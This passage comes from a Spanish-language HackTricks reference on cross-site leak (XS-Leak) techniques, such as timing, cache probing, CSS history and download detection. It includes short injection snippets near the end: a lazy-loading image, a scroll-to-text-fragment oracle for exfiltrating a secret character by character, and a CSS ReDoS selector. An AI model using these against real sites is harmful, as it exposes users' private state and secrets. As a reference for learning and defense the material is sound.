Un ejemplo de esta t√©cnica es que en Chrome, un **PDF** puede ser **detectado** con **conteo de marcos** porque se utiliza un `embed` internamente. Hay [Par√°metros de URL Abiertos](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) que permiten cierto control sobre el contenido como `zoom`, `view`, `page`, `toolbar` donde esta t√©cnica podr√≠a ser interesante.

### Elementos HTML

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Resumen:** Lee el valor filtrado para distinguir entre 2 posibles estados
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

La filtraci√≥n de informaci√≥n a trav√©s de elementos HTML es una preocupaci√≥n en la seguridad web, particularmente cuando se generan archivos de medios din√°micos basados en la informaci√≥n del usuario, o cuando se a√±aden marcas de agua, alterando el tama√±o del medio. Esto puede ser explotado por atacantes para diferenciar entre posibles estados analizando la informaci√≥n expuesta por ciertos elementos HTML.

### Informaci√≥n Expuesta por Elementos HTML

* **HTMLMediaElement**: Este elemento revela la `duraci√≥n` y los tiempos `buffered` del medio, que se pueden acceder a trav√©s de su API. [Lee m√°s sobre HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Expone `videoHeight` y `videoWidth`. En algunos navegadores, propiedades adicionales como `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` y `webkitDecodedFrameCount` est√°n disponibles, ofreciendo informaci√≥n m√°s detallada sobre el contenido del medio. [Lee m√°s sobre HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Esta funci√≥n proporciona detalles sobre la calidad de reproducci√≥n de video, incluyendo `totalVideoFrames`, que puede indicar la cantidad de datos de video procesados. [Lee m√°s sobre getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Este elemento filtra la `altura` y `ancho` de una imagen. Sin embargo, si una imagen es inv√°lida, estas propiedades devolver√°n 0, y la funci√≥n `image.decode()` ser√° rechazada, indicando el fallo en cargar la imagen correctamente. [Lee m√°s sobre HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### Propiedad CSS

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Resumen:** Identificar variaciones en el estilo del sitio web que correlacionen con el estado o estatus del usuario.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Las aplicaciones web pueden cambiar el **estilo del sitio web dependiendo del estado del usuario**. Los archivos CSS de origen cruzado pueden ser incrustados en la p√°gina del atacante con el **elemento de enlace HTML**, y las **reglas** ser√°n **aplicadas** a la p√°gina del atacante. Si una p√°gina cambia din√°micamente estas reglas, un atacante puede **detectar** estas **diferencias** dependiendo del estado del usuario.\
Como t√©cnica de filtraci√≥n, el atacante puede usar el m√©todo `window.getComputedStyle` para **leer propiedades CSS** de un elemento HTML espec√≠fico. Como resultado, un atacante puede leer propiedades CSS arbitrarias si se conoce el elemento afectado y el nombre de la propiedad.

### Historia CSS

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Resumen:** Detectar si el estilo `:visited` se aplica a una URL indicando que ya fue visitada
* **Ejemplo de C√≥digo**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Seg√∫n [**esto**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), esto no funciona en Chrome sin cabeza.
{% endhint %}

El selector CSS `:visited` se utiliza para estilizar URLs de manera diferente si han sido visitadas previamente por el usuario. En el pasado, el m√©todo `getComputedStyle()` podr√≠a ser empleado para identificar estas diferencias de estilo. Sin embargo, los navegadores modernos han implementado medidas de seguridad para evitar que este m√©todo revele el estado de un enlace. Estas medidas incluyen devolver siempre el estilo computado como si el enlace hubiera sido visitado y restringir los estilos que se pueden aplicar con el selector `:visited`.

A pesar de estas restricciones, es posible discernir el estado visitado de un enlace de manera indirecta. Una t√©cnica implica enga√±ar al usuario para que interact√∫e con un √°rea afectada por CSS, utilizando espec√≠ficamente la propiedad `mix-blend-mode`. Esta propiedad permite la mezcla de elementos con su fondo, revelando potencialmente el estado visitado basado en la interacci√≥n del usuario.

Adem√°s, la detecci√≥n puede lograrse sin interacci√≥n del usuario aprovechando los tiempos de renderizado de los enlaces. Dado que los navegadores pueden renderizar enlaces visitados y no visitados de manera diferente, esto puede introducir una diferencia de tiempo medible en el renderizado. Se mencion√≥ un proof of concept (PoC) en un informe de errores de Chromium, demostrando esta t√©cnica utilizando m√∫ltiples enlaces para amplificar la diferencia de tiempo, haciendo que el estado visitado sea detectable a trav√©s del an√°lisis de tiempo.

Para m√°s detalles sobre estas propiedades y m√©todos, visita sus p√°ginas de documentaci√≥n:

* `:visited`: [Documentaci√≥n MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [Documentaci√≥n MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [Documentaci√≥n MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### Filtraci√≥n de X-Frame de ContentDocument

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Encabezados
* **M√°s info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Resumen:** En Google Chrome, se muestra una p√°gina de error dedicada cuando una p√°gina es bloqueada de ser incrustada en un sitio de origen cruzado debido a restricciones de X-Frame-Options.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

En Chrome, si una p√°gina con el encabezado `X-Frame-Options` configurado en "deny" o "same-origin" es incrustada como un objeto, aparece una p√°gina de error. Chrome devuelve de manera √∫nica un objeto de documento vac√≠o (en lugar de `null`) para la propiedad `contentDocument` de este objeto, a diferencia de los iframes o de otros navegadores. Los atacantes podr√≠an explotar esto detectando el documento vac√≠o, revelando potencialmente informaci√≥n sobre el estado del usuario, especialmente si los desarrolladores configuran de manera inconsistente el encabezado X-Frame-Options, a menudo pasando por alto las p√°ginas de error. La conciencia y la aplicaci√≥n consistente de encabezados de seguridad son cruciales para prevenir tales filtraciones.

### Detecci√≥n de Descargas

* **M√©todos de Inclusi√≥n**: Marcos, Pop-ups
* **Diferencia Detectable**: Encabezados
* **M√°s info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Resumen:** Un atacante puede discernir descargas de archivos aprovechando iframes; la accesibilidad continua del iframe implica una descarga de archivo exitosa.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

El encabezado `Content-Disposition`, espec√≠ficamente `Content-Disposition: attachment`, instruye al navegador a descargar contenido en lugar de mostrarlo en l√≠nea. Este comportamiento puede ser explotado para detectar si un usuario tiene acceso a una p√°gina que desencadena una descarga de archivo. En navegadores basados en Chromium, hay algunas t√©cnicas para detectar este comportamiento de descarga:

1. **Monitoreo de la Barra de Descargas**:
* Cuando se descarga un archivo en navegadores basados en Chromium, aparece una barra de descarga en la parte inferior de la ventana del navegador.
* Al monitorear cambios en la altura de la ventana, los atacantes pueden inferir la aparici√≥n de la barra de descarga, sugiriendo que se ha iniciado una descarga.
2. **Navegaci√≥n de Descarga con Iframes**:
* Cuando una p√°gina desencadena una descarga de archivo utilizando el encabezado `Content-Disposition: attachment`, no causa un evento de navegaci√≥n.
* Al cargar el contenido en un iframe y monitorear eventos de navegaci√≥n, es posible verificar si la disposici√≥n del contenido causa una descarga de archivo (sin navegaci√≥n) o no.
3. **Navegaci√≥n de Descarga sin Iframes**:
* Similar a la t√©cnica del iframe, este m√©todo implica usar `window.open` en lugar de un iframe.
* Monitorear eventos de navegaci√≥n en la nueva ventana abierta puede revelar si se desencaden√≥ una descarga de archivo (sin navegaci√≥n) o si el contenido se muestra en l√≠nea (se produce navegaci√≥n).

En escenarios donde solo los usuarios autenticados pueden desencadenar tales descargas, estas t√©cnicas pueden ser utilizadas para inferir indirectamente el estado de autenticaci√≥n del usuario basado en la respuesta del navegador a la solicitud de descarga.

### Bypass de Cach√© HTTP Particionado <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: Tiempos
* **M√°s info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Resumen:** Un atacante puede discernir descargas de archivos aprovechando iframes; la accesibilidad continua del iframe implica una descarga de archivo exitosa.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Esta es la raz√≥n por la que esta t√©cnica es interesante: Chrome ahora tiene **particionamiento de cach√©**, y la clave de cach√© de la p√°gina reci√©n abierta es: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, pero si abro una p√°gina ngrok y uso fetch en ella, la clave de cach√© ser√°: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **clave de cach√© es diferente**, por lo que la cach√© no puede ser compartida. Puedes encontrar m√°s detalles aqu√≠: [Ganar seguridad y privacidad mediante la partici√≥n de la cach√©](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Comentario de [**aqu√≠**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Si un sitio `example.com` incluye un recurso de `*.example.com/resource`, entonces ese recurso tendr√° la **misma clave de cach√©** que si el recurso fuera **solicitado a trav√©s de navegaci√≥n de nivel superior**. Eso se debe a que la clave de cach√© consiste en el _eTLD+1_ de nivel superior y el _eTLD+1_ de marco.

Debido a que acceder a la cach√© es m√°s r√°pido que cargar un recurso, es posible intentar cambiar la ubicaci√≥n de una p√°gina y cancelarla 20 ms (por ejemplo) despu√©s. Si el origen fue cambiado despu√©s de la detenci√≥n, significa que el recurso fue almacenado en cach√©.\
O simplemente podr√≠a **enviar algunas solicitudes fetch a la p√°gina potencialmente almacenada en cach√© y medir el tiempo que toma**.

### Redirecci√≥n Manual <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclusi√≥n**: API Fetch
* **Diferencia Detectable**: Redirecciones
* **M√°s info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Resumen:** Es posible averiguar si una respuesta a una solicitud fetch es una redirecci√≥n
* **Ejemplo de C√≥digo**:

![](<../.gitbook/assets/image (652).png>)

### Fetch con AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclusi√≥n**: API Fetch
* **Diferencia Detectable**: Tiempos
* **M√°s info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Resumen:** Es posible intentar cargar un recurso y abortar antes de que se cargue; dependiendo de si se activa un error, el recurso fue o no almacenado en cach√©.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Usa _**fetch**_ y _**setTimeout**_ con un **AbortController** para detectar si el **recurso est√° almacenado en cach√©** y para expulsar un recurso espec√≠fico de la cach√© del navegador. Adem√°s, el proceso ocurre sin almacenar en cach√© nuevo contenido.

### Contaminaci√≥n de Scripts

* **M√©todos de Inclusi√≥n**: Elementos HTML (script)
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Resumen:** Es posible **sobrescribir funciones integradas** y leer sus argumentos incluso desde **scripts de origen cruzado** (que no pueden ser le√≠dos directamente), esto podr√≠a **filtrar informaci√≥n valiosa**.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Resumen:** Mide el tiempo de ejecuci√≥n de una web usando service workers.
* **Ejemplo de C√≥digo**:

En el escenario dado, el atacante toma la iniciativa de registrar un **service worker** dentro de uno de sus dominios, espec√≠ficamente "attacker.com". A continuaci√≥n, el atacante abre una nueva ventana en el sitio web objetivo desde el documento principal e instruye al **service worker** para que comience un temporizador. A medida que la nueva ventana comienza a cargarse, el atacante navega la referencia obtenida en el paso anterior a una p√°gina gestionada por el **service worker**.

Al llegar la solicitud iniciada en el paso anterior, el **service worker** responde con un c√≥digo de estado **204 (Sin Contenido)**, terminando efectivamente el proceso de navegaci√≥n. En este punto, el **service worker** captura una medici√≥n del temporizador iniciado anteriormente en el paso dos. Esta medici√≥n se ve influenciada por la duraci√≥n de JavaScript que causa retrasos en el proceso de navegaci√≥n.

{% hint style="warning" %}
En un tiempo de ejecuci√≥n es posible **eliminar** **factores de red** para obtener **mediciones m√°s precisas**. Por ejemplo, cargando los recursos utilizados por la p√°gina antes de cargarla.
{% endhint %}

### Tiempo de Fetch

* **M√©todos de Inclusi√≥n**: API Fetch
* **Diferencia Detectable**: Tiempos (generalmente debido al Contenido de la P√°gina, C√≥digo de Estado)
* **M√°s info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Resumen:** Usa [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) para medir el tiempo que toma realizar una solicitud. Se podr√≠an usar otros relojes.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Tiempo entre Ventanas

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: Tiempos (generalmente debido al Contenido de la P√°gina, C√≥digo de Estado)
* **M√°s info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Resumen:** Usa [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) para medir el tiempo que toma realizar una solicitud usando `window.open`. Se podr√≠an usar otros relojes.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente impulsados por las **herramientas m√°s avanzadas** de la comunidad.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Con HTML o Re Inyecci√≥n

Aqu√≠ puedes encontrar t√©cnicas para exfiltrar informaci√≥n de un HTML de origen cruzado **inyectando contenido HTML**. Estas t√©cnicas son interesantes en casos donde por alguna raz√≥n puedes **inyectar HTML pero no puedes inyectar c√≥digo JS**.

### Marcado Colgante

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[marcado-colgante-html-sin-script-inyecci√≥n](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Carga Perezosa de Im√°genes

Si necesitas **exfiltrar contenido** y puedes **agregar HTML antes del secreto**, deber√≠as revisar las **t√©cnicas comunes de marcado colgante**.\
Sin embargo, si por cualquier raz√≥n **DEBES** hacerlo **car√°cter por car√°cter** (quiz√°s la comunicaci√≥n es a trav√©s de un acierto de cach√©), puedes usar este truco.

**Las im√°genes** en HTML tienen un atributo "**loading**" cuyo valor puede ser "**lazy**". En ese caso, la imagen se cargar√° cuando se vea y no mientras la p√°gina se est√° cargando:
```html
<img src=/something loading=lazy >
```
Por lo tanto, lo que puedes hacer es **agregar muchos caracteres basura** (por ejemplo, **miles de "W"**) para **llenar la p√°gina web antes del secreto o agregar algo como** `<br><canvas height="1850px"></canvas><br>.`\
Luego, si por ejemplo nuestra **inyecci√≥n aparece antes de la bandera**, la **imagen** se **cargar√≠a**, pero si aparece **despu√©s** de la **bandera**, la bandera + la basura **impedir√°n que se cargue** (tendr√°s que jugar con cu√°nta basura colocar). Esto es lo que sucedi√≥ en [**este informe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Otra opci√≥n ser√≠a usar el **scroll-to-text-fragment** si est√° permitido:

#### Scroll-to-text-fragment

Sin embargo, haces que el **bot acceda a la p√°gina** con algo como
```
#:~:text=SECR
```
As√≠ que la p√°gina web ser√° algo como: **`https://victim.com/post.html#:~:text=SECR`**

Donde post.html contiene los caracteres basura del atacante y una imagen de carga perezosa y luego se a√±ade el secreto del bot.

Lo que har√° este texto es hacer que el bot acceda a cualquier texto en la p√°gina que contenga el texto `SECR`. Como ese texto es el secreto y est√° justo **debajo de la imagen**, la **imagen solo se cargar√° si el secreto adivinado es correcto**. As√≠ que ah√≠ tienes tu or√°culo para **exfiltrar el secreto car√°cter por car√°cter**.

Un ejemplo de c√≥digo para explotar esto: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Carga Perezosa de Im√°genes Basada en Tiempo

Si **no es posible cargar una imagen externa** que podr√≠a indicar al atacante que la imagen fue cargada, otra opci√≥n ser√≠a intentar **adivinar el car√°cter varias veces y medir eso**. Si la imagen se carga, todas las solicitudes tardar√≠an m√°s que si la imagen no se carga. Esto es lo que se utiliz√≥ en la [**soluci√≥n de este informe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **resumido aqu√≠:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### ReDoS de CSS

Si se utiliza `jQuery(location.hash)`, es posible averiguar a trav√©s del tiempo **si existe alg√∫n contenido HTML**, esto se debe a que si el selector `main[id='site-main']` no coincide, no necesita verificar el resto de los **selectores**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Inyecci√≥n de CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defensas

Hay mitigaciones recomendadas en [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) tambi√©n en cada secci√≥n de la wiki [https://xsleaks.dev/](https://xsleaks.dev/). Echa un vistazo all√≠ para m√°s informaci√≥n sobre c√≥mo protegerse contra estas t√©cnicas.

## Referencias

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente, impulsados por las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
